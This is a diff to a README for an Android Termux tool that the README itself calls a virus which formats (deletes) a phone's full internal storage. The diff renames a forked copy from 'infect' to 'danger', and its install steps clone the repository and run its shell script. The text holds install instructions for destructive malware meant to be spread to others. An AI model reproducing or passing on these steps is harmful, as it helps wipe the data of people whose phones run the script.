@@ -31,12 +31,12 @@ Warning 🚦 This Virus Formates (Deletes) Full Internal Storage So think and Us
 * `pkg install python2 -y`
 * `pkg install git -y`
 * `pip install lolcat`
-* `git clone https://github.com/noob-hackers/infect`
+* `git clone https://github.com/Mr-Krishna-90/danger`
 * `cd $HOME`
 * `ls`
-* `cd infect`
+* `cd danger`
 * `ls`
-* `bash infect.sh`
+* `bash danger.sh`
 ```
 [+]-- Now you need internet connection to continue further process...
 [+]-- You can select any option by clicking on your keyboard
@@ -64,7 +64,7 @@ __EXIT__ :
 <img width="46%" src="https://user-images.githubusercontent.com/49580304/96560932-c4f71c00-1273-11eb-98d5-78210392ad54.jpg"/>
 </p>
 
-### If there is an issue in this tool, report [here](https://github.com/Mr_Krishna_909
+### If there is an issue in this tool, report [here](https://github.com/Mr_Krishna_90
 /I_Picker/issues)
 
 <p style="color:purple"><b>Connect With Us:</b></p>
